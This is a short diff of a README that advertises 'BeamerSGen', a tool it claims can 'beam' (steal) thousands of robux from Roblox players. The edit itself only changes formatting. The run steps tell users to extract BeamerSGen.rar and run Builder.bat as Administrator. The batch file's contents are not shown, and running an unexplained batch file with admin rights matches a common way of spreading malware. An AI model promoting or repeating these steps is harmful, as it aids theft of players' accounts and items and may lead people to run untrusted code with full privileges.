@@ -12,7 +12,7 @@
 > ***Simply is the first best tool for beaming thousands of robux!***
 
 **HOW RUN ?**
-**>** Extract here `BeamerSGen.rar` **➙** Open as Adminstrator `Builder.bat`
+> **>** Extract here `BeamerSGen.rar` **➙** Open as Adminstrator `Builder.bat`
 
 **FUNCTION:**
 ```
